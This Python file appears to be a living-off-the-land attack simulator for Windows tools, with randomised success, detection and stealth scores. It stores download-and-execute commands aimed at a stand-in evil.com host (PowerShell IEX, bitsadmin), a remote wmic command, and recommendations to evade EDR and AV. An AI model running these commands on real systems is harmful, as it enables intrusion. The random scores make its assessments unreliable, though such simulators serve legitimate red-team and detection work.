#!/usr/bin/env python3
"""
OMEGA LotL (Living off the Land) Simulator
Simulates attacks using legitimate system tools
"""

import json
import time
import uuid
import random
import subprocess
import platform
from datetime import datetime, timedelta
from enum import Enum
from typing import Dict, List, Any, Optional
from collections import defaultdict
import threading

class LotLTool(Enum):
    """Legitimate tools used for LotL attacks"""
    POWERSHELL = "powershell"
    CMD = "cmd"
    WMI = "wmi"
    PS_EXEC = "psexec"
    BITSADMIN = "bitsadmin"
    CERTUTIL = "certutil"
    REGSVR32 = "regsvr32"
    MSBUILD = "msbuild"
    RUNDLL32 = "rundll32"
    WMIC = "wmic"
    SCHTASKS = "schtasks"
    NET = "net"
    NBTSTAT = "nbtstat"
    NETSTAT = "netstat"
    TASKSLIST = "tasklist"
    SYSTEMINFO = "systeminfo"

class LotLTechnique(Enum):
    """LotL attack techniques"""
    PROCESS_INJECTION = "T1055"
    SCRIPTING = "T1064"
    COMMAND_LINE_INTERFACE = "T1059"
    POWERSHELL = "T1059.001"
    WINDOWS_MANAGEMENT = "T1047"
    SCHEDULED_TASK = "T1053"
    SERVICE_EXECUTION = "T1035"
    REGISTRY_RUN_KEYS = "T1547.001"
    DLL_SIDELOADING = "T1574.002"
    LIVING_OFF_THE_LAND = "T1218"

class LotLSimulation:
    """LotL attack simulation"""
    
    def __init__(self, simulation_id: str, name: str, target_os: str = None):
        self.simulation_id = simulation_id
        self.name = name
        self.target_os = target_os or platform.system().lower()
        self.created = datetime.now()
        self.status = "initialized"
        self.tools_used = []
        self.techniques = []
        self.commands = []
        self.detections = []
        self.artifacts = []
        self.evasion_attempts = []
        
        # OS-specific tool availability
        self.available_tools = self._get_available_tools()
    
    def _get_available_tools(self) -> List[LotLTool]:
        """Get available tools for target OS"""
        if self.target_os == "windows":
            return [
                LotLTool.POWERSHELL, LotLTool.CMD, LotLTool.WMI,
                LotLTool.BITSADMIN, LotLTool.CERTUTIL, LotLTool.REGSVR32,
                LotLTool.MSBUILD, LotLTool.RUNDLL32, LotLTool.WMIC,
                LotLTool.SCHTASKS, LotLTool.NET, LotLTool.NETSTAT,
                LotLTool.TASKSLIST, LotLTool.SYSTEMINFO
            ]
        elif self.target_os == "linux":
            return [
                LotLTool.CMD  # Using bash instead
            ]
        else:
            return []
    
    def execute_tool(self, tool: LotLTool, technique: LotLTechnique, 
                    command: str, description: str) -> Dict:
        """Execute a LotL tool simulation"""
        
        if tool not in self.available_tools:
            return {
                "success": False,
                "error": f"Tool {tool.value} not available for {self.target_os}"
            }
        
        execution_id = f"EXEC-{str(uuid.uuid4())[:8]}"
        
        execution = {
            "execution_id": execution_id,
            "tool": tool.value,
            "technique": technique.value,
            "technique_name": technique.name,
            "command": command,
            "description": description,
            "timestamp": datetime.now().isoformat(),
            "simulated": True,  # We simulate execution for safety
            "success": random.choice([True, False, True])  # 66% success rate
        }
        
        # Simulate execution
        time.sleep(random.uniform(0.1, 0.3))
        
        # Add results based on success
        if execution["success"]:
            execution["results"] = self._simulate_successful_execution(tool, command)
            execution["detected"] = random.choice([True, False])  # 50% detection rate
        else:
            execution["results"] = {"error": "Execution failed or was blocked"}
            execution["detected"] = True  # Failed executions often detected
        
        # Record detection if applicable
        if execution["detected"]:
            detection = self._record_detection(execution)
            execution["detection_id"] = detection["detection_id"]
        
        # Add to simulation records
        self.tools_used.append(tool.value)
        if technique.value not in self.techniques:
            self.techniques.append(technique.value)
        
        self.commands.append(execution)
        
        return execution
    
    def _simulate_successful_execution(self, tool: LotLTool, command: str) -> Dict:
        """Simulate successful tool execution"""
        base_results = {
            "tool": tool.value,
            "command_executed": command,
            "execution_time_ms": random.randint(50, 500),
            "exit_code": 0
        }
        
        # Add tool-specific simulated results
        if tool == LotLTool.POWERSHELL:
            base_results.update({
                "output": "Command executed successfully via PowerShell",
                "process_id": random.randint(1000, 10000),
                "session_id": random.randint(1, 10)
            })
        elif tool == LotLTool.CMD:
            base_results.update({
                "output": "Command completed successfully",
                "directory": "C:\\Windows\\System32",
                "user": "SYSTEM"
            })
        elif tool == LotLTool.WMI:
            base_results.update({
                "output": "WMI query executed",
                "namespace": "root\\cimv2",
                "objects_returned": random.randint(1, 50)
            })
        elif tool == LotLTool.BITSADMIN:
            base_results.update({
                "output": "BITS job created successfully",
                "job_id": str(uuid.uuid4())[:8],
                "state": "TRANSFERRING"
            })
        
        return base_results
    
    def _record_detection(self, execution: Dict) -> Dict:
        """Record detection of LotL activity"""
        detection_id = f"DETECT-{str(uuid.uuid4())[:8]}"
        
        detection = {
            "detection_id": detection_id,
            "execution_id": execution["execution_id"],
            "tool": execution["tool"],
            "technique": execution["technique"],
            "detection_type": random.choice(["behavioral", "signature", "anomaly"]),
            "detection_source": random.choice(["EDR", "SIEM", "AV", "Network Monitor"]),
            "confidence": random.choice(["low", "medium", "high"]),
            "timestamp": datetime.now().isoformat(),
            "action_taken": random.choice(["alerted", "blocked", "quarantined", "monitored"])
        }
        
        self.detections.append(detection)
        return detection
    
    def attempt_evasion(self, technique: str, description: str) -> Dict:
        """Attempt evasion technique"""
        evasion_id = f"EVADE-{str(uuid.uuid4())[:8]}"
        
        evasion = {
            "evasion_id": evasion_id,
            "technique": technique,
            "description": description,
            "timestamp": datetime.now().isoformat(),
            "successful": random.choice([True, False]),
            "details": self._simulate_evasion_result(technique)
        }
        
        self.evasion_attempts.append(evasion)
        return evasion
    
    def _simulate_evasion_result(self, technique: str) -> Dict:
        """Simulate evasion technique result"""
        techniques = {
            "obfuscation": {
                "method": "Command obfuscation using encoding",
                "effectiveness": random.randint(60, 90)
            },
            "living_off_land": {
                "method": "Using legitimate system tools",
                "effectiveness": random.randint(70, 95)
            },
            "process_hollowing": {
                "method": "Injecting into legitimate processes",
                "effectiveness": random.randint(50, 80)
            },
            "timing_based": {
                "method": "Delayed execution and timing attacks",
                "effectiveness": random.randint(40, 70)
            }
        }
        
        return techniques.get(technique, {
            "method": "Unknown evasion technique",
            "effectiveness": 50
        })
    
    def generate_artifacts(self) -> List[Dict]:
        """Generate forensic artifacts from simulation"""
        artifacts = []
        
        # Process artifacts
        artifacts.append({
            "artifact_id": f"ART-{str(uuid.uuid4())[:8]}",
            "type": "process_creation",
            "tool": random.choice([t.value for t in self.available_tools]),
            "timestamp": datetime.now().isoformat(),
            "details": "Process creation event detected",
            "forensic_value": "high"
        })
        
        # Network artifacts
        artifacts.append({
            "artifact_id": f"ART-{str(uuid.uuid4())[:8]}",
            "type": "network_connection",
            "source_ip": f"10.0.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "destination_ip": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "port": random.randint(1024, 65535),
            "protocol": random.choice(["TCP", "UDP"]),
            "forensic_value": "medium"
        })
        
        # File system artifacts
        artifacts.append({
            "artifact_id": f"ART-{str(uuid.uuid4())[:8]}",
            "type": "file_system",
            "path": random.choice([
                "C:\\Windows\\Temp\\",
                "C:\\Users\\Public\\",
                "/tmp/",
                "/var/tmp/"
            ]),
            "filename": f"temp_{random.randint(1000, 9999)}.tmp",
            "forensic_value": "high"
        })
        
        self.artifacts.extend(artifacts)
        return artifacts
    
    def calculate_stealth_score(self) -> float:
        """Calculate stealth score for simulation"""
        if not self.commands:
            return 0.0
        
        total_commands = len(self.commands)
        detected_commands = len([c for c in self.commands if c.get("detected", False)])
        
        if total_commands == 0:
            return 100.0
        
        detection_rate = (detected_commands / total_commands) * 100
        stealth_score = 100.0 - detection_rate
        
        # Apply evasion bonus
        successful_evasions = len([e for e in self.evasion_attempts if e["successful"]])
        if successful_evasions > 0:
            stealth_score += (successful_evasions * 5)
        
        return max(0.0, min(100.0, stealth_score))
    
    def generate_report(self) -> Dict:
        """Generate comprehensive simulation report"""
        stealth_score = self.calculate_stealth_score()
        
        # Tool usage statistics
        tool_usage = defaultdict(int)
        for tool in self.tools_used:
            tool_usage[tool] += 1
        
        # Technique statistics
        technique_usage = defaultdict(int)
        for cmd in self.commands:
            technique_usage[cmd["technique_name"]] += 1
        
        return {
            "simulation_id": self.simulation_id,
            "name": self.name,
            "target_os": self.target_os,
            "status": self.status,
            "created": self.created.isoformat(),
            "duration_seconds": (datetime.now() - self.created).total_seconds(),
            "metrics": {
                "total_commands": len(self.commands),
                "successful_commands": len([c for c in self.commands if c["success"]]),
                "detected_commands": len([c for c in self.commands if c.get("detected", False)]),
                "evasion_attempts": len(self.evasion_attempts),
                "successful_evasions": len([e for e in self.evasion_attempts if e["successful"]]),
                "artifacts_generated": len(self.artifacts),
                "stealth_score": round(stealth_score, 2)
            },
            "tool_usage": dict(tool_usage),
            "technique_usage": dict(technique_usage),
            "detection_analysis": {
                "total_detections": len(self.detections),
                "detection_sources": list(set(d["detection_source"] for d in self.detections)),
                "average_confidence": self._calculate_average_confidence()
            },
            "stealth_assessment": self._assess_stealth_level(stealth_score),
            "recommendations": self._generate_recommendations(stealth_score)
        }
    
    def _calculate_average_confidence(self) -> str:
        """Calculate average detection confidence"""
        if not self.detections:
            return "none"
        
        confidence_values = {
            "low": 1,
            "medium": 2,
            "high": 3
        }
        
        total = sum(confidence_values.get(d["confidence"], 0) for d in self.detections)
        average = total / len(self.detections)
        
        if average >= 2.5:
            return "high"
        elif average >= 1.5:
            return "medium"
        else:
            return "low"
    
    def _assess_stealth_level(self, stealth_score: float) -> Dict:
        """Assess stealth level based on score"""
        if stealth_score >= 80:
            level = "EXCELLENT"
            description = "Highly stealthy operations, low detection rate"
        elif stealth_score >= 60:
            level = "GOOD"
            description = "Good stealth with occasional detections"
        elif stealth_score >= 40:
            level = "MODERATE"
            description = "Moderate stealth, significant detection rate"
        elif stealth_score >= 20:
            level = "POOR"
            description = "Poor stealth, high detection rate"
        else:
            level = "VERY POOR"
            description = "Very poor stealth, almost always detected"
        
        return {
            "level": level,
            "score": stealth_score,
            "description": description
        }
    
    def _generate_recommendations(self, stealth_score: float) -> List[str]:
        """Generate recommendations based on stealth score"""
        recommendations = []
        
        if stealth_score < 50:
            recommendations.append("Improve evasion techniques to reduce detection rate")
            recommendations.append("Use more legitimate tools and fewer suspicious commands")
            recommendations.append("Implement better command obfuscation")
        
        if len(self.detections) > 0:
            detection_sources = set(d["detection_source"] for d in self.detections)
            recommendations.append(f"Evade detection from: {', '.join(detection_sources)}")
        
        # Always include
        recommendations.extend([
            "Regularly update Living off the Land techniques",
            "Monitor for new detection methods",
            "Test against multiple security products",
            "Document successful evasion techniques"
        ])
        
        return recommendations

class LotLSimulator:
    """OMEGA LotL Simulator - Main component"""
    
    def __init__(self):
        self.name = "OMEGA LotL Simulator"
        self.version = "1.0.0"
        self.simulations = {}
        self.tool_library = self._build_tool_library()
        self.technique_library = self._build_technique_library()
    
    def _build_tool_library(self) -> Dict:
        """Build library of LotL tools"""
        return {
            LotLTool.POWERSHELL: {
                "description": "PowerShell - Windows scripting and automation",
                "common_uses": ["Execution", "Discovery", "Lateral Movement"],
                "detection_difficulty": "medium",
                "examples": [
                    "Download and execute payload",
                    "System reconnaissance",
                    "Persistence establishment"
                ]
            },
            LotLTool.CMD: {
                "description": "Command Prompt - Windows command line",
                "common_uses": ["Execution", "Discovery", "File Operations"],
                "detection_difficulty": "low",
                "examples": [
                    "File copying and movement",
                    "Network enumeration",
                    "Service management"
                ]
            },
            LotLTool.WMI: {
                "description": "Windows Management Instrumentation",
                "common_uses": ["Discovery", "Lateral Movement", "Execution"],
                "detection_difficulty": "high",
                "examples": [
                    "Remote process creation",
                    "System information gathering",
                    "Event subscription for persistence"
                ]
            },
            LotLTool.BITSADMIN: {
                "description": "Background Intelligent Transfer Service",
                "common_uses": ["Download", "Persistence", "Data Exfiltration"],
                "detection_difficulty": "medium",
                "examples": [
                    "File download from remote server",
                    "Scheduled transfer jobs",
                    "Data exfiltration"
                ]
            }
        }
    
    def _build_technique_library(self) -> Dict:
        """Build library of LotL techniques"""
        return {
            LotLTechnique.POWERSHELL: {
                "description": "Using PowerShell for malicious activities",
                "mitre_id": "T1059.001",
                "difficulty": "medium",
                "detection_methods": ["Command line monitoring", "PowerShell logging", "AMSI"]
            },
            LotLTechnique.WINDOWS_MANAGEMENT: {
                "description": "Abusing Windows management tools",
                "mitre_id": "T1047",
                "difficulty": "high",
                "detection_methods": ["WMI event monitoring", "Process creation logging"]
            },
            LotLTechnique.SCHEDULED_TASK: {
                "description": "Using scheduled tasks for persistence",
                "mitre_id": "T1053",
                "difficulty": "low",
                "detection_methods": ["Scheduled task auditing", "Autoruns analysis"]
            },
            LotLTechnique.LIVING_OFF_THE_LAND: {
                "description": "Using legitimate system tools maliciously",
                "mitre_id": "T1218",
                "difficulty": "variable",
                "detection_methods": ["Behavioral analysis", "Anomaly detection", "EDR"]
            }
        }
    
    def create_simulation(self, name: str, target_os: str = None) -> LotLSimulation:
        """Create new LotL simulation"""
        simulation_id = f"LOTL-{str(uuid.uuid4())[:8]}"
        
        simulation = LotLSimulation(simulation_id, name, target_os)
        self.simulations[simulation_id] = simulation
        
        print(f"✅ Created LotL simulation: {name} ({simulation_id})")
        print(f"   Target OS: {simulation.target_os}")
        print(f"   Available tools: {len(simulation.available_tools)}")
        
        return simulation
    
    def run_standard_simulation(self, simulation_id: str) -> Dict:
        """Run standard LotL simulation"""
        if simulation_id not in self.simulations:
            raise ValueError(f"Simulation {simulation_id} not found")
        
        simulation = self.simulations[simulation_id]
        simulation.status = "running"
        
        print(f"🚀 Running LotL simulation: {simulation.name}")
        
        # Execute common LotL techniques
        executions = []
        
        # 1. PowerShell execution
        if LotLTool.POWERSHELL in simulation.available_tools:
            ps_exec = simulation.execute_tool(
                LotLTool.POWERSHELL,
                LotLTechnique.POWERSHELL,
                "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                "Download and execute PowerShell payload"
            )
            executions.append(ps_exec)
        
        # 2. Command line discovery
        if LotLTool.CMD in simulation.available_tools:
            cmd_exec = simulation.execute_tool(
                LotLTool.CMD,
                LotLTechnique.COMMAND_LINE_INTERFACE,
                "systeminfo & netstat -ano & tasklist",
                "System information gathering via command line"
            )
            executions.append(cmd_exec)
        
        # 3. WMI for lateral movement
        if LotLTool.WMI in simulation.available_tools:
            wmi_exec = simulation.execute_tool(
                LotLTool.WMI,
                LotLTechnique.WINDOWS_MANAGEMENT,
                "wmic /node:TARGET process call create 'cmd.exe /c whoami'",
                "Remote command execution via WMI"
            )
            executions.append(wmi_exec)
        
        # 4. BITSAdmin for download
        if LotLTool.BITSADMIN in simulation.available_tools:
            bits_exec = simulation.execute_tool(
                LotLTool.BITSADMIN,
                LotLTechnique.LIVING_OFF_THE_LAND,
                "bitsadmin /transfer job /download /priority normal http://evil.com/malware.exe C:\\Temp\\update.exe",
                "File download using BITSAdmin"
            )
            executions.append(bits_exec)
        
        # Attempt evasion techniques
        evasion_results = []
        for technique in ["obfuscation", "living_off_land"]:
            evasion = simulation.attempt_evasion(
                technique,
                f"Attempting {technique} evasion technique"
            )
            evasion_results.append(evasion)
        
        # Generate forensic artifacts
        artifacts = simulation.generate_artifacts()
        
        # Complete simulation
        simulation.status = "completed"
        
        # Generate report
        report = simulation.generate_report()
        
        print(f"🎉 LotL simulation completed: {simulation.name}")
        print(f"   Stealth score: {report['metrics']['stealth_score']}")
        print(f"   Detected commands: {report['metrics']['detected_commands']}/{report['metrics']['total_commands']}")
        print(f"   Stealth level: {report['stealth_assessment']['level']}")
        
        return {
            "simulation_id": simulation_id,
            "name": simulation.name,
            "status": "completed",
            "executions": executions,
            "evasion_results": evasion_results,
            "artifacts_generated": len(artifacts),
            "report": report
        }
    
    def get_tool_info(self, tool: LotLTool) -> Dict:
        """Get information about a LotL tool"""
        if tool in self.tool_library:
            info = self.tool_library[tool].copy()
            info["tool"] = tool.value
            return info
        return {"error": f"Tool {tool.value} not in library"}
    
    def get_technique_info(self, technique: LotLTechnique) -> Dict:
        """Get information about a LotL technique"""
        if technique in self.technique_library:
            info = self.technique_library[technique].copy()
            info["technique"] = technique.value
            info["technique_name"] = technique.name
            return info
        return {"error": f"Technique {technique.value} not in library"}
    
    def get_status(self) -> Dict:
        """Get LotL simulator status"""
        return {
            "component": self.name,
            "version": self.version,
            "status": "operational",
            "total_simulations": len(self.simulations),
            "completed_simulations": len([s for s in self.simulations.values() if s.status == "completed"]),
            "tool_library_size": len(self.tool_library),
            "technique_library_size": len(self.technique_library),
            "capabilities": [
                "Living off the Land attack simulation",
                "Tool and technique library",
                "Stealth scoring and assessment",
                "Forensic artifact generation",
                "Evasion technique testing"
            ]
        }

def test_lotl_simulator():
    """Test the OMEGA LotL Simulator"""
    print("🧪 Testing OMEGA LotL Simulator...")
    
    try:
        # Initialize simulator
        simulator = LotLSimulator()
        print("   ✅ LotL Simulator initialized")
        
        # Create a simulation
        simulation = simulator.create_simulation(
            "Windows LotL Attack Simulation",
            target_os="windows"
        )
        
        print(f"   📋 Simulation created: {simulation.name}")
        print(f"   🛠️  Available tools: {len(simulation.available_tools)}")
        
        # Run simulation
        print("\n   🚀 Running LotL simulation...")
        results = simulator.run_standard_simulation(simulation.simulation_id)
        
        report = results["report"]
        
        print(f"\n   📊 Simulation Results:")
        print(f"      Total commands: {report['metrics']['total_commands']}")
        print(f"      Successful commands: {report['metrics']['successful_commands']}")
        print(f"      Detected commands: {report['metrics']['detected_commands']}")
        print(f"      Stealth score: {report['metrics']['stealth_score']}")
        print(f"      Stealth level: {report['stealth_assessment']['level']}")
        
        # Show tool usage
        print(f"\n   🛠️  Tool Usage:")
        for tool, count in report['tool_usage'].items():
            print(f"      {tool}: {count} executions")
        
        # Show recommendations
        print(f"\n   🎯 Recommendations:")
        for i, rec in enumerate(report['recommendations'][:3], 1):
            print(f"      {i}. {rec}")
        
        return True
        
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    success = test_lotl_simulator()
    if success:
        print("\n✅ OMEGA LotL Simulator test passed!")
    else:
        print("\n❌ OMEGA LotL Simulator test failed!")
